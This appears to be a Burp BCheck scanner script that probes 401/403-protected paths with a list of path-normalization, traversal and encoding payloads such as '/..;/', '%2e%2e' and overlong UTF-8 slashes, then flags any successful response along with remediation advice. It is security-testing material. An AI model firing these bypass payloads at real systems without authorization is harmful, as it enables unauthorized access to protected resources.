# Path Normalization 401/403 Bypass Scanner
# Based on techniques from nomore403 and BypassFuzzer
# Author: Combined from devploit/nomore403 and intrudir/BypassFuzzer

metadata:
    language: v2-beta
    name: "Path Normalization 401/403 Bypass"
    description: "Attempts to bypass 401/403 using path normalization, traversal, and encoding tricks"
    author: "Combined (nomore403 + BypassFuzzer)"
    tags: "bypass", "403", "401", "path", "normalization", "active"

define:
    desc = "Potential 401/403 bypass via path manipulation"
    reme = "Normalize paths before access control checks. Use allowlist-based path validation."

# ============================================================================
# Path Suffix/Prefix Bypass Payloads
# ============================================================================
run for each:
    path_payload =
        "/",
        "//",
        "///",
        "/.",
        "/./",
        "/.//",
        "/.;/",
        "/..;/",
        "/..;",
        "/../",
        "/../../",
        "/../../../",
        "/..",
        "/..%00/",
        "/..%0d/",
        "/..%0a/",
        "/..%09/",
        "/..%ff/",
        "/%2e/",
        "/%2e%2e/",
        "/%2e%2e%2f/",
        "/%2f/",
        "/%2f%2f/",
        "/;/",
        "/;/../",
        "/;x/",
        "/;x/../",
        "/?",
        "/?;",
        "/#",
        "/%20/",
        "/%20%23",
        "/%23",
        "/%09",
        "/%0a",
        "/%0d",
        "/%00",
        "/%01",
        "/.json",
        "/.html",
        "/.php",
        "/.asp",
        "/.aspx",
        "/.css",
        "/.js",
        "/.txt",
        "/.xml",
        "/.png",
        "/.ico",
        "/.gif",
        "/.jpg",
        "/.wsdl",
        "?debug=1",
        "?WSDL",
        "?test",
        "?anything",
        "%c0%af",
        "%c0%af%c0%af",
        "%ef%bc%8f",
        "%ef%bc%8f%ef%bc%8f",
        "%E5%98%8A",
        "%E5%98%8D",
        "%u002e",
        "%u002e/%u002e",
        "%u560a",
        "%u560d"

given request then
    if {base.response.status_code} matches "(401|403)" then
        # Test path suffix
        send request:
            path: `{base.request.url.path}{path_payload}`

        if {latest.response.status_code} matches "^[23]" then
            report issue:
                severity: high
                confidence: tentative
                detail: `{desc}. Payload suffix: {path_payload}. Original status: {base.response.status_code}, Bypass status: {latest.response.status_code}`
                remediation: {reme}
        end if
    end if
